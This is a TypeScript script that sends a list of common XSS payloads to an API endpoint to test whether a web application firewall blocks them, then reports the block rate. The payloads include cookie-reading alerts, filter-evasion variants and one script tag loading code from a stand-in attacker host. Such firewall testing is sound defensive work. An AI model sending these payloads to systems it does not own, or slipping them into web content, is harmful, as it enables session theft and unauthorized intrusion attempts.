#!/usr/bin/env ts-node
/**
 * XSS Attack Simulator
 *
 * Simulates Cross-Site Scripting (XSS) attacks to test WAF protection
 * These attacks should be blocked/counted by the WAF
 *
 * WARNING: Only use against your own infrastructure for testing purposes
 */

import axios from 'axios';

// Configuration
const API_URL = process.env.API_URL || 'https://your-api-url.execute-api.us-east-1.amazonaws.com/dev';
const NUM_ATTACKS = parseInt(process.env.NUM_ATTACKS || '20', 10);
const DELAY_MS = parseInt(process.env.DELAY_MS || '100', 10);

interface AttackResult {
  blocked: number;
  allowed: number;
  errors: number;
  totalTime: number;
  details: { payload: string; status: number; blocked: boolean }[];
}

/**
 * Common XSS payloads
 */
const XSS_PAYLOADS = [
  '<script>alert("XSS")</script>',
  '<script>alert(document.cookie)</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg/onload=alert("XSS")>',
  '<iframe src="javascript:alert(\'XSS\')">',
  '<body onload=alert("XSS")>',
  '<input type="text" value="XSS" onfocus=alert("XSS")>',
  '<marquee onstart=alert("XSS")>',
  '<div style="background:url(javascript:alert(\'XSS\'))">',
  '"><script>alert(String.fromCharCode(88,83,83))</script>',
  '<IMG SRC="javascript:alert(\'XSS\');">',
  '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
  '<IMG SRC=`javascript:alert("XSS")`>',
  '<SCRIPT SRC=http://attacker.com/xss.js></SCRIPT>',
  '<<SCRIPT>alert("XSS");//<</SCRIPT>',
  '<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
  '<img src=x:alert(alt) onerror=eval(src) alt=xss>',
  '<svg><script>alert&#40;1&#41;</script>',
  '<object data="javascript:alert(\'XSS\')">',
  '<embed src="javascript:alert(\'XSS\')">',
];

/**
 * Execute XSS attacks
 */
async function executeXSSAttacks(): Promise<AttackResult> {
  console.log('⚠️  Starting XSS attack simulation...');
  console.log(`📍 API URL: ${API_URL}`);
  console.log(`🎯 Number of attacks: ${NUM_ATTACKS}`);
  console.log(`⏱️  Delay between attacks: ${DELAY_MS}ms\n`);

  const result: AttackResult = {
    blocked: 0,
    allowed: 0,
    errors: 0,
    totalTime: 0,
    details: [],
  };

  const startTime = Date.now();

  for (let i = 0; i < NUM_ATTACKS; i++) {
    const payload = XSS_PAYLOADS[i % XSS_PAYLOADS.length];

    try {
      const requestStart = Date.now();

      // Try different attack vectors
      const attackVectors = [
        // Query string injection
        {
          method: 'get',
          url: `${API_URL}/documents?name=${encodeURIComponent(payload)}`,
        },
        // Body injection
        {
          method: 'post',
          url: `${API_URL}/documents/upload-url`,
          data: {
            fileName: payload,
            contentType: 'text/html',
          },
        },
        // Header injection (if applicable)
        {
          method: 'get',
          url: `${API_URL}/documents`,
          headers: {
            'X-Custom-Header': payload,
          },
        },
      ];

      const vector = attackVectors[i % attackVectors.length];
      const response = await axios({
        method: vector.method as any,
        url: vector.url,
        data: (vector as any).data,
        headers: (vector as any).headers,
        timeout: 5000,
        validateStatus: () => true, // Accept all status codes
      });

      const requestTime = Date.now() - requestStart;

      // WAF blocks typically return 403
      const wasBlocked = response.status === 403;

      if (wasBlocked) {
        result.blocked++;
        console.log(`🛡️  Attack ${i + 1}/${NUM_ATTACKS} BLOCKED - Payload: "${payload.substring(0, 40)}..." - ${requestTime}ms`);
      } else if (response.status >= 200 && response.status < 500) {
        result.allowed++;
        console.log(`⚠️  Attack ${i + 1}/${NUM_ATTACKS} ALLOWED - Status: ${response.status} - Payload: "${payload.substring(0, 40)}..." - ${requestTime}ms`);
      } else {
        result.errors++;
        console.log(`❌ Attack ${i + 1}/${NUM_ATTACKS} ERROR - Status: ${response.status} - ${requestTime}ms`);
      }

      result.details.push({
        payload: payload.substring(0, 50),
        status: response.status,
        blocked: wasBlocked,
      });

      // Delay between attacks
      if (i < NUM_ATTACKS - 1) {
        await new Promise((resolve) => setTimeout(resolve, DELAY_MS));
      }
    } catch (error: any) {
      result.errors++;
      const errorMsg = error.message || 'Unknown error';
      console.log(`❌ Attack ${i + 1}/${NUM_ATTACKS} - Error: ${errorMsg}`);
    }
  }

  result.totalTime = Date.now() - startTime;

  return result;
}

/**
 * Main execution
 */
async function main() {
  console.log('=====================================');
  console.log('      XSS ATTACK SIMULATOR          ');
  console.log('=====================================\n');

  const result = await executeXSSAttacks();

  console.log('\n=====================================');
  console.log('              RESULTS                ');
  console.log('=====================================');
  console.log(`🛡️  Blocked attacks: ${result.blocked}`);
  console.log(`⚠️  Allowed attacks: ${result.allowed}`);
  console.log(`❌ Errors: ${result.errors}`);
  console.log(`⏱️  Total time: ${result.totalTime}ms`);
  console.log(`📊 Block rate: ${Math.round((result.blocked / NUM_ATTACKS) * 100)}%`);

  if (result.allowed > 0) {
    console.log('\n⚠️  WARNING: Some XSS attacks were not blocked!');
    console.log('Check your WAF configuration and ensure rules are in BLOCK mode.');
  } else if (result.blocked === NUM_ATTACKS) {
    console.log('\n✅ SUCCESS: All XSS attacks were blocked by WAF!');
  }

  console.log('\n=====================================\n');
}

// Run if executed directly
if (require.main === module) {
  main().catch((error) => {
    console.error('Fatal error:', error);
    process.exit(1);
  });
}

export { executeXSSAttacks };
